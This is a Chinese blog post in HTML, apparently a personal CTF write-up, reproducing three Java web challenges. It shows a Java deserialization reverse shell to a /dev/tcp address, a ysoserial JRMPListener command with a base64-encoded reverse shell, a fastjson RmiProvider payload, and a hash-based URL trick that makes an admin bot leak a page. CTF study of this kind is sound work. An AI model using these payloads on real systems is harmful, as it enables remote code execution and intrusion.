<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>java_web题目复现记录 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="开一个新坑~~">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="http://ch3n9w.cpolar.cn/posts/sec-java-web/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="http://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="http://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://ch3n9w.cpolar.cn/posts/sec-java-web/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="java_web题目复现记录" />
<meta property="og:description" content="开一个新坑~~" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://ch3n9w.cpolar.cn/posts/sec-java-web/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-01-03T10:57:44+00:00" />
<meta property="article:modified_time" content="2020-01-03T10:57:44+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="java_web题目复现记录"/>
<meta name="twitter:description" content="开一个新坑~~"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "java_web题目复现记录",
      "item": "http://ch3n9w.cpolar.cn/posts/sec-java-web/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "java_web题目复现记录",
  "name": "java_web题目复现记录",
  "description": "开一个新坑~~\n",
  "keywords": [
    
  ],
  "articleBody": "开一个新坑~~\n2020 网鼎杯 filejava 读目录可以爆出绝对路径\n读下tomcat的日志(logs/catalina.out), 看到一个war包, 下载, 看到upload的时候会解析\nif (filename.startsWith(\"excel-\") \u0026\u0026 \"xlsx\".equals(fileExtName)) { try { Workbook wb1 = WorkbookFactory.create(in); Sheet sheet = wb1.getSheetAt(0); System.out.println(sheet.getFirstRowNum()); } catch (InvalidFormatException var20) { System.err.println(\"poi-ooxml-3.10 has something wrong\"); var20.printStackTrace(); } } 然后参考https://www.jishuwen.com/d/2inW/zh-hk 把workbook.xml和content-type.xml都改了\n2020 VNCTF easyspringmvc 考察java反序列化\n下载war包后用jd-gui打开看源代码, 目录结构\n主要看classes.com下面的\nPictureController.class\npackage WEB-INF.classes.com.controller; import com.controller.PictureController; import com.tools.ClientInfo; import java.io.File; import java.io.FileInputStream; import java.io.InputStream; import javax.servlet.ServletOutputStream; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import org.apache.commons.fileupload.disk.DiskFileItem; import org.springframework.stereotype.Controller; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.multipart.MultipartFile; import org.springframework.web.multipart.commons.CommonsMultipartFile; @Controller public class PictureController { @RequestMapping({\"/showpic.form\"}) public String index(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) throws Exception { if (file == null) file = \"showpic.jsp\"; String[] attribute = file.split(\"\\\\.\"); String suffix = attribute[attribute.length - 1]; if (!suffix.equals(\"jsp\")) { boolean isadmin = ((ClientInfo)httpServletRequest.getSession().getAttribute(\"cinfo\")).getName().equals(\"admin\"); if (!isadmin \u0026\u0026 (!suffix.equals(\"jpg\") || !suffix.equals(\"gif\"))) { return \"onlypic\"; } show(httpServletRequest, httpServletResponse, file); return \"showpic\"; } StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i \u003c attribute.length - 1; i++) { stringBuilder.append(attribute[i]); } String jspFile = stringBuilder.toString(); int unixSep = jspFile.lastIndexOf('/'); int winSep = jspFile.lastIndexOf('\\\\'); int pos = (winSep \u003e unixSep) ? winSep : unixSep; jspFile = (pos != -1) ? jspFile.substring(pos + 1) : jspFile; if (jspFile.equals(\"\")) { jspFile = \"showpic\"; } return jspFile; } private void show(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) throws Exception { httpServletResponse.setContentType(\"image/jpeg\"); InputStream in = httpServletRequest.getServletContext().getResourceAsStream(\"/WEB-INF/resource/\" + filename); if (in == null) { in = new FileInputStream(filename); } ServletOutputStream servletOutputStream = httpServletResponse.getOutputStream(); byte[] b = new byte[1024]; while (in.read(b) != -1) { servletOutputStream.write(b); } in.close(); servletOutputStream.flush(); servletOutputStream.close(); } @RequestMapping({\"/uploadpic.form\"}) public String upload(MultipartFile file, HttpServletRequest request, HttpServletResponse response) throws Exception { ClientInfo cinfo = (ClientInfo)request.getSession().getAttribute(\"cinfo\"); if (!cinfo.getGroup().equals(\"webmanager\")) return \"notaccess\"; if (file == null) { return \"uploadpic\"; } String originalFilename = ((DiskFileItem)((CommonsMultipartFile)file).getFileItem()).getName(); String realPath = request.getSession().getServletContext().getRealPath(\"/WEB-INF/resource/\"); String path = realPath + originalFilename; file.transferTo(new File(path)); request.getSession().setAttribute(\"newpicfile\", path); return \"uploadpic\"; } } 主要用于文件的读取和写入, 会去通过cookie校验身份.\nClientInfoFilter.class\npackage WEB-INF.classes.com.filters; import com.tools.ClientInfo; import com.tools.Tools; import java.io.IOException; import java.util.Base64; import javax.servlet.Filter; import javax.servlet.FilterChain; import javax.servlet.FilterConfig; import javax.servlet.ServletException; import javax.servlet.ServletRequest; import javax.servlet.ServletResponse; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; public class ClentInfoFilter implements Filter { public void init(FilterConfig fcg) {} public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException { Cookie[] cookies = ((HttpServletRequest)request).getCookies(); boolean exist = false; Cookie cookie = null; if (cookies != null) { for (Cookie c : cookies) { if (c.getName().equals(\"cinfo\")) { exist = true; cookie = c; break; } } } if (exist) { String b64 = cookie.getValue(); Base64.Decoder decoder = Base64.getDecoder(); byte[] bytes = decoder.decode(b64); ClientInfo cinfo = null; if (b64.equals(\"\") || bytes == null) { cinfo = new ClientInfo(\"Anonymous\", \"normal\", ((HttpServletRequest)request).getRequestedSessionId()); Base64.Encoder encoder = Base64.getEncoder(); try { bytes = Tools.create(cinfo); } catch (Exception e) { e.printStackTrace(); } cookie.setValue(encoder.encodeToString(bytes)); } else { try { cinfo = (ClientInfo)Tools.parse(bytes); } catch (Exception e) { e.printStackTrace(); } } ((HttpServletRequest)request).getSession().setAttribute(\"cinfo\", cinfo); } else { Base64.Encoder encoder = Base64.getEncoder(); try { ClientInfo cinfo = new ClientInfo(\"Anonymous\", \"normal\", ((HttpServletRequest)request).getRequestedSessionId()); byte[] bytes = Tools.create(cinfo); cookie = new Cookie(\"cinfo\", encoder.encodeToString(bytes)); cookie.setMaxAge(86400); ((HttpServletResponse)response).addCookie(cookie); ((HttpServletRequest)request).getSession().setAttribute(\"cinfo\", cinfo); } catch (Exception e) { e.printStackTrace(); } } chain.doFilter(request, response); } public void destroy() {} } 控制cookie中cinfo项, 并通过cinfo来校验身份, 如果是第一次访问就会给你设置一个cinfo, 身份是Anonymous, 组别是normal\nClientInfo.class\npackage WEB-INF.classes.com.tools; import com.tools.ClientInfo; import java.io.Serializable; public class ClientInfo implements Serializable { private static final long serialVersionUID = 1L; private String name; private String group; private String id; public ClientInfo(String name, String group, String id) { this.name = name; this.group = group; this.id = id; } public String getName() { return this.name; } public String getGroup() { return this.group; } public String getId() { return this.id; } } 用于存储用户信息, 会被拿来序列化和base64之后作为cinfo的内容.\nTool.class\npackage WEB-INF.classes.com.tools; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Tools implements Serializable { private static final long serialVersionUID = 1L; public static Object parse(byte[] bytes) throws Exception { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes)); return ois.readObject(); } private String testCall; public static byte[] create(Object obj) throws Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); ObjectOutputStream outputStream = new ObjectOutputStream(bos); outputStream.writeObject(obj); return bos.toByteArray(); } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } } Serializeable接口会去查看当前类中是否定义writeObject readObject如果有的话, 序列化和反序列化就用这两个方法来实现, 否则就用Serializeable 内置的接口去进行序列化反序列化的操作.\n总结起来可能的点\n读文件 反序列化 读文件首先要admin登录才行, 从源码中可以知道用户名用户组, 接下来写java来伪造cinfo.\n创建java项目, 拷贝源码, 目录结构如下(由于序列化的时候会带进命名空间信息, 所以一定要对的上)\nMain.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { ClientInfo cinfo = new ClientInfo(\"admin\", \"webmanager\", \"B18D77761C9C952BEDB6CDAC4205265B\"); byte[] bytes = Tools.create(cinfo); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } 伪造admin登录后尝试读文件, 这里有个疑惑的地方, 看源码文件读取的路径是直接和/WEB-INF/resource/拼接在一起的, 看赵师傅的wp中是靠/../../etc/passwd和它拼接之后可以读到文件, 这样的话路径就是/WEB-INF/resource//../../etc/passwd了, 然后我尝试不用/开头去拼接成/WEB-INF/resource/../../../../../../etc/passwd不管加多少个../都读不到对应的文件, 很是困惑. 然后读/../../flag显示没有权限.\n写文件的功能114告诉我可以往../../../../../../../../tmp下面写, 具体多少个../我忘了….但是没有文件包含的地方.\n至此文件读取部分走不通了.\n反序列化部分.\nTools.java中这段代码\nprivate void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { Object obj = in.readObject(); (new ProcessBuilder((String[])obj)).start(); } 其中的ProcessBuilder是可以执行系统命令的.\nhttps://blog.csdn.net/wangmx1993328/article/details/80838768\n那可以考虑让反序列化的cinfo内容不是Clientinfo的序列化内容而是Tools的序列化内容.\n将Tools.java中添加\nprivate String testCall[]; public String[] getTestCall() { return testCall; } public void setTestCall(String[] testCall) { this.testCall = testCall; } Main.java\nimport java.util.Base64; import com.tools.Tools; import com.tools.ClientInfo; public class Main { public static void main(String[] args) { try { String[] cmd = {\"bash\", \"-c\", \"bash -i\u003e\u0026 /dev/tcp/174.0.220.248/9999 0\u003e\u00261\"}; Tools tools = new Tools(); tools.setTestCall(cmd); byte[] bytes = Tools.create(tools); Base64.Encoder encoder = Base64.getEncoder(); System.out.println(encoder.encodeToString(bytes)); } catch (Exception e) { e.printStackTrace(); } } } 反弹shell\n最后一步还是有些不明白的地方, 回头来看.\n2019 空指针ctf 公开赛 hint页面要求是admin才能访问, 那么思路大概清楚了, 就是通过csrf让admin去访问hint然后把响应内容发送回来, 比赛的时候没看js代码就做题就是铁憨憨行为.\nfunction isProd(){ return window.location.host=='treasure.npointer.cn'; } function loadPage() { if (!window.location.hash) { window.location.hash = '#home' } url = window.location.hash.substring(1)+'.html'; //调试太麻烦了，日常测试放开限制 if(isProd()) { url = window.location.origin + '/' + url; } $.get(url, function(result){ $(\"#content\").html(result); }); } window.addEventListener('hashchange',function(event){ loadPage(); }); loadPage(); 简单理解一下就是: 当锚点变化的时候, 就判断host, 如果host是treasure.npointer.cn就加载treasure.npointer.cn加锚点加html的值, 如果不是, 那么就直接加载锚点加上html的值, payload\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot 这里域名后面的./也是第一次见识, 他确实能访问到treasure.npointer.cn但是host名不再是treasure.npointer.cn了, 那么就可以绕过对主机名的判断直接请求锚点后面的值了.\n这里有点坑, 其实是自己第一次接触太菜了.因为同源策略的影响, 服务端那边必须要设置Access-Control-Allow-Origin=*否则vps那边会拒绝跨域请求\n使用以下脚本在同目录下执行开启python的服务器\n#!/usr/bin/env python # -*- coding: utf-8 -*- try: from http.server import HTTPServer, SimpleHTTPRequestHandler, test as test_orig import sys def test (*args): test_orig(*args, port=int(sys.argv[1]) if len(sys.argv) \u003e 1 else 8000) except ImportError: # Python 2 from BaseHTTPServer import HTTPServer, test from SimpleHTTPServer import SimpleHTTPRequestHandler class CORSRequestHandler (SimpleHTTPRequestHandler): def end_headers (self): self.send_header('Access-Control-Allow-Origin', '*') SimpleHTTPRequestHandler.end_headers(self) if __name__ == '__main__': test(CORSRequestHandler, HTTPServer) 然后发送\nhttp://treasure.npointer.cn./index.html#http://39.105.176.37:8000/bot nc接受到了源代码.\n(分析过程以后补上)\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\nvps上面执行\njava -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1088 CommonsCollections5 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8zOS4xMDUuMTc2LjM3Lzk5OTkgMD4mMQo=}|{base64,-d}|{bash,-i}' 通过submit发送\n{\"@\\u0074ype\":\"org.apache.commons.proxy.provider.remoting.RmiProvider\",\"host\":\"39.105.176.37\",port:\"1088\",\"name\":\"Object\"} ",
  "wordCount" : "950",
  "inLanguage": "en",
  "datePublished": "2020-01-03T10:57:44Z",
  "dateModified": "2020-01-03T10:57:44Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://ch3n9w.cpolar.cn/posts/sec-java-web/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "http://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="http://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="http://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      java_web题目复现记录
    </h1>
    <div class="post-meta"><span title='2020-01-03 10:57:44 +0000 UTC'>January 3, 2020</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;950 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#2020-网鼎杯-filejava">2020 网鼎杯 filejava</a></li>
    <li><a href="#2020-vnctf-easyspringmvc">2020 VNCTF easyspringmvc</a></li>
    <li><a href="#2019-空指针ctf-公开赛">2019 空指针ctf 公开赛</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>开一个新坑~~</p>
<h2 id="2020-网鼎杯-filejava">2020 网鼎杯 filejava<a hidden class="anchor" aria-hidden="true" href="#2020-网鼎杯-filejava">#</a></h2>
<p>读目录可以爆出绝对路径</p>
<p>读下tomcat的日志(logs/catalina.out), 看到一个war包, 下载, 看到upload的时候会解析</p>
<pre tabindex="0"><code>if (filename.startsWith(&#34;excel-&#34;) &amp;&amp; &#34;xlsx&#34;.equals(fileExtName)) {
    try {
        Workbook wb1 = WorkbookFactory.create(in);
        Sheet sheet = wb1.getSheetAt(0);
        System.out.println(sheet.getFirstRowNum());
    } catch (InvalidFormatException var20) {
        System.err.println(&#34;poi-ooxml-3.10 has something wrong&#34;);
        var20.printStackTrace();
    }
}
</code></pre><p>然后参考https://www.jishuwen.com/d/2inW/zh-hk 把workbook.xml和content-type.xml都改了</p>
<h2 id="2020-vnctf-easyspringmvc">2020 VNCTF easyspringmvc<a hidden class="anchor" aria-hidden="true" href="#2020-vnctf-easyspringmvc">#</a></h2>
<p>考察java反序列化</p>
<p>下载war包后用jd-gui打开看源代码, 目录结构</p>
<p><img loading="lazy" src="/images/image-20200301173825332.png" alt="image-20200301173825332"  />
</p>
<p>主要看classes.com下面的</p>
<p>PictureController.class</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> WEB<span style="color:#f92672">-</span>INF.<span style="color:#a6e22e">classes</span>.<span style="color:#a6e22e">com</span>.<span style="color:#a6e22e">controller</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.controller.PictureController;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> com.tools.ClientInfo;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.File;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.FileInputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.ServletOutputStream;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.apache.commons.fileupload.disk.DiskFileItem;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.stereotype.Controller;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.bind.annotation.RequestMapping;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.multipart.MultipartFile;
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> org.springframework.web.multipart.commons.CommonsMultipartFile;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@Controller</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">PictureController</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@RequestMapping</span>({<span style="color:#e6db74">&#34;/showpic.form&#34;</span>})
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">index</span>(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String file) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>)
</span></span><span style="display:flex;"><span>      file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;showpic.jsp&#34;</span>; 
</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> attribute <span style="color:#f92672">=</span> file.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;\\.&#34;</span>);
</span></span><span style="display:flex;"><span>    String suffix <span style="color:#f92672">=</span> attribute<span style="color:#f92672">[</span>attribute.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> 1<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>suffix.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;jsp&#34;</span>)) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">boolean</span> isadmin <span style="color:#f92672">=</span> ((ClientInfo)httpServletRequest.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;cinfo&#34;</span>)).<span style="color:#a6e22e">getName</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;admin&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>isadmin <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">!</span>suffix.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;jpg&#34;</span>) <span style="color:#f92672">||</span> <span style="color:#f92672">!</span>suffix.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;gif&#34;</span>))) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;onlypic&#34;</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      show(httpServletRequest, httpServletResponse, file);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;showpic&#34;</span>;
</span></span><span style="display:flex;"><span>    } 
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    StringBuilder stringBuilder <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> 0; i <span style="color:#f92672">&lt;</span> attribute.<span style="color:#a6e22e">length</span> <span style="color:#f92672">-</span> 1; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>      stringBuilder.<span style="color:#a6e22e">append</span>(attribute<span style="color:#f92672">[</span>i<span style="color:#f92672">]</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    String jspFile <span style="color:#f92672">=</span> stringBuilder.<span style="color:#a6e22e">toString</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> unixSep <span style="color:#f92672">=</span> jspFile.<span style="color:#a6e22e">lastIndexOf</span>(<span style="color:#e6db74">&#39;/&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> winSep <span style="color:#f92672">=</span> jspFile.<span style="color:#a6e22e">lastIndexOf</span>(<span style="color:#e6db74">&#39;\\&#39;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> pos <span style="color:#f92672">=</span> (winSep <span style="color:#f92672">&gt;</span> unixSep) <span style="color:#f92672">?</span> winSep : unixSep;
</span></span><span style="display:flex;"><span>    jspFile <span style="color:#f92672">=</span> (pos <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) <span style="color:#f92672">?</span> jspFile.<span style="color:#a6e22e">substring</span>(pos <span style="color:#f92672">+</span> 1) : jspFile;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (jspFile.<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;&#34;</span>)) {
</span></span><span style="display:flex;"><span>      jspFile <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;showpic&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jspFile;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">show</span>(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, String filename) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    httpServletResponse.<span style="color:#a6e22e">setContentType</span>(<span style="color:#e6db74">&#34;image/jpeg&#34;</span>);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    InputStream in <span style="color:#f92672">=</span> httpServletRequest.<span style="color:#a6e22e">getServletContext</span>().<span style="color:#a6e22e">getResourceAsStream</span>(<span style="color:#e6db74">&#34;/WEB-INF/resource/&#34;</span> <span style="color:#f92672">+</span> filename);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (in <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>      in <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> FileInputStream(filename);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    ServletOutputStream servletOutputStream <span style="color:#f92672">=</span> httpServletResponse.<span style="color:#a6e22e">getOutputStream</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> b <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>1024<span style="color:#f92672">]</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> (in.<span style="color:#a6e22e">read</span>(b) <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span>1) {
</span></span><span style="display:flex;"><span>      servletOutputStream.<span style="color:#a6e22e">write</span>(b);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    in.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>    servletOutputStream.<span style="color:#a6e22e">flush</span>();
</span></span><span style="display:flex;"><span>    servletOutputStream.<span style="color:#a6e22e">close</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">@RequestMapping</span>({<span style="color:#e6db74">&#34;/uploadpic.form&#34;</span>})
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">upload</span>(MultipartFile file, HttpServletRequest request, HttpServletResponse response) <span style="color:#66d9ef">throws</span> Exception {
</span></span><span style="display:flex;"><span>    ClientInfo cinfo <span style="color:#f92672">=</span> (ClientInfo)request.<span style="color:#a6e22e">getSession</span>().<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#34;cinfo&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>cinfo.<span style="color:#a6e22e">getGroup</span>().<span style="color:#a6e22e">equals</span>(<span style="color:#e6db74">&#34;webmanager&#34;</span>))
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;notaccess&#34;</span>; 
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (file <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;uploadpic&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    String originalFilename <span style="color:#f92672">=</span> ((DiskFileItem)((CommonsMultipartFile)file).<span style="color:#a6e22e">getFileItem</span>()).<span style="color:#a6e22e">getName</span>();
